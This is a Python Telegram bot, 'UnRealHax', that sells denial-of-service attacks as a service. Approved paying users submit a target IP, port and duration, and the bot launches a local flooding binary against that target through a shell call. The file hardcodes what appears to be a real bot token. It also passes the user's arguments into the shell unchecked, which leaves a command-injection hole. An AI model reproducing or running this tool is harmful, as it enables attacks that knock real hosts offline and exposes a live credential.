import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7060678490:AAH0ruqg0jY3E1kBG4zxABrciG3QChxLRYc'
ADMIN_USER_ID = 7252677891
USERS_FILE = 'users.txt'

# Dictionary to keep track of user attack status and processes
user_attack_status = {}
user_attack_processes = {}

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the UnRealHax 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Buy Private File @UnRealHax ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def manage(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /manage <add|rem> <user_id>*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} added.*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} removed.*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context, user_id):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./unrealhax {ip} {port} {duration} 10",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        # Store the process in the dictionary
        user_attack_processes[user_id] = process

        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        # Mark the user's attack as completed and remove the process
        user_attack_status[user_id] = False
        user_attack_processes.pop(user_id, None)
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using UnRealHax service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to be approved to use this bot.*", parse_mode='Markdown')
        return

    # Check if the user already has an ongoing attack
    if user_attack_status.get(user_id, False):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You already have an attack in progress. Please wait for it to finish or use the stop button to terminate it.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Enjoy And Buy Private File @UnRealHax  💥*"
    ), parse_mode='Markdown')

    # Mark this user as having an ongoing attack
    user_attack_status[user_id] = True

    # Create stop button
    keyboard = [
        [InlineKeyboardButton("🛑 Stop Attack", callback_data=f"stop_{user_id}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await context.bot.send_message(chat_id=chat_id, text="*⚠️ Attack in progress... Click below to stop it.*", reply_markup=reply_markup, parse_mode='Markdown')

    # Run the attack in a separate task
    asyncio.create_task(run_attack(chat_id, ip, port, duration, context, user_id))

async def stop_attack_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.data.split("_")[1]
    chat_id = query.message.chat.id

    # Check if the user has an ongoing attack
    if not user_attack_status.get(user_id, False):
        await query.answer(text="No ongoing attack to stop.", show_alert=True)
        return

    # Get the process associated with the user's attack
    process = user_attack_processes.get(user_id)
    if process:
        process.terminate()  # Terminate the attack process
        await process.wait()

        # Mark the user's attack as stopped
        user_attack_status[user_id] = False
        user_attack_processes.pop(user_id, None)

        # Send response message
        await context.bot.send_message(chat_id=chat_id, text="*🛑 Attack stopped! 🛑*", parse_mode='Markdown')

        await query.answer(text="Attack stopped!", show_alert=True)
    else:
        await query.answer(text="Could not stop the attack.", show_alert=True)

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("manage", manage))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CallbackQueryHandler(stop_attack_callback, pattern="^stop_"))  # Add callback query handler for stop button
    application.run_polling()

if __name__ == '__main__':
    main()